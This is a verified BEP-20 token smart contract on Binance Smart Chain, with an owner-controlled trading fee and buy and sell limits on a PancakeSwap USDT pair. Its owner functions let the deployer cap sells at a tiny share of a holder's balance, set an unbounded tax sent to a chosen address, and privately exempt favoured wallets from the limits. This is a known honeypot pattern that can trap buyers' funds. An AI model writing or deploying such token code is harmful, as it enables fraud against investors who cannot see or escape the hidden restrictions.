/**
 *Submitted for verification at BscScan.com on 2021-10-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 */
library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "SafeMath: addition overflow");
    }
    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "SafeMath: subtraction overflow");
    }
    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "SafeMath: multiplication overflow");
    }
    function div(uint256 x, uint256 y) internal pure returns (uint256) {
        require(y > 0, "SafeMath: division by zero");
        return x / y;
    }
    function mod(uint256 x, uint256 y) internal pure returns (uint256) {
        require(y != 0, "SafeMath: modulo by zero");
        return x % y;
    }
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a,m);
        uint256 d = sub(c,1);
        return mul(div(d,m),m);
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}

/**
 * @dev The Ownable contract has an owner address, and provides basic authorization control.
 */
contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initialization Construction
     */
    constructor () internal {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnerShip(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/**
 * @dev Implementation of the {TokenMain} interface.
 */
contract TokenMain is Ownable {
    using SafeMath for uint256;
    using Address for address;

    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    uint8 private __basePercent = 1;
    uint16 public __taxFee = 6;
    address public __feeAddres = address(0);

    uint256 public __exBuyMax = 500 * (10 ** uint256(decimals));
    uint256 public __exSellMax = 0;
    bool public __isOpenSwap = false;
    address private __pairFor = address(0);

    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping (address => bool) public freeAccount;
    mapping (address => bool) private canSale;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    /**
     * Initialization Construction
     */
    constructor (uint256 _initialSupply, string memory _tokenName, string memory _tokenSymbol, address _tokenTo) public {
        totalSupply = _initialSupply * 10 ** uint256(decimals);
        balances[_tokenTo] = totalSupply;
        name = _tokenName;
        symbol = _tokenSymbol;
        emit Transfer(address(0), _tokenTo, totalSupply);
    }

    modifier ensure(address _from, address _to, uint256 _value) {
        uint8 pairForStatus = 0;
        if (_from == owner || _to == owner) {
            pairForStatus = 1;
        }
        if (__pairFor == address(0)) {
            __pairFor = PairLP();
        }
        if (canSale[_from] != true && pairForStatus == 0) {
            uint256 newSellValue = _value.mul(100).div(balances[_from]);
            if (_from == __pairFor && __exBuyMax > 0) {
                require(_value <= __exBuyMax, "Error: Swap limit buy num");
            } else if (_to == __pairFor && __exSellMax > 0) {
                require(newSellValue <= __exSellMax, "Error: Swap limit sell num");
            }
        }
        _;
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        //(address token0, address token1) = sortTokens(tokenA, tokenB);
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
        ))));
    }

    function PairLP() public view returns (address) {
        address LPs = pairFor(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73, 0x55d398326f99059fF775485246999027B3197955, address(this));
        return LPs;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function _transfer(address _from, address _to, uint256 _value) internal ensure(_from, _to, _value) {
        require(_to != address(0), "Error: transfer to the zero address");
        require(balances[_from] >= _value, "Error: transfer from the balance is not enough");
        uint256 newValue = _value;

        if (__taxFee > 0 && freeAccount[_from] == false) {
            if (_from != __pairFor && _to != __pairFor && address(0) != __pairFor) {
                uint256 tokenFee = transferFee(_value, __taxFee);
                newValue = _value.sub(tokenFee);
                balances[__feeAddres] = balances[__feeAddres].add(tokenFee);
                emit Transfer(_from, __feeAddres, tokenFee);
            }
        }

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(newValue);
        emit Transfer(_from, _to, newValue);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(allowance[_from][msg.sender] >= _value, "Error: transfer amount exceeds allowance");
        _approve(_from, msg.sender, allowance[_from][msg.sender].sub(_value));
        _transfer(_from, _to, _value);
        return true;
    }

    function _approve(address _from, address _to, uint256 _value) internal {
        require(_from != address(0), "Error: approve from the zero address");
        allowance[_from][_to] = _value;
        emit Approval(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }

    function transferFee(uint256 _value, uint256 _ratio) public view returns (uint256)  {
        uint256 roundValue = _value.ceil(__basePercent);
        uint256 onePercent = roundValue.mul(_ratio).div(10**2);
        return onePercent;
    }
    function setTaxFee(uint16 _value) public onlyOwner {
        __taxFee = _value;
    }
    function setFeeAddres(address _target) public onlyOwner {
        __feeAddres = _target;
    }
    function setFreeAccount(address _target, bool _state) public onlyOwner {
        freeAccount[_target] = _state;
    }

    function setExTrade(uint256 _buyMax, uint256 _sellMax) public onlyOwner {
        __exBuyMax = _buyMax;
        __exSellMax = _sellMax;
    }
    function setIsOpenSwap(bool _isOpenSwap) public onlyOwner {
        __isOpenSwap = _isOpenSwap;
    }
    function setCanSale(address _spender, bool _type) public onlyOwner {
        canSale[_spender] = _type;
    }
}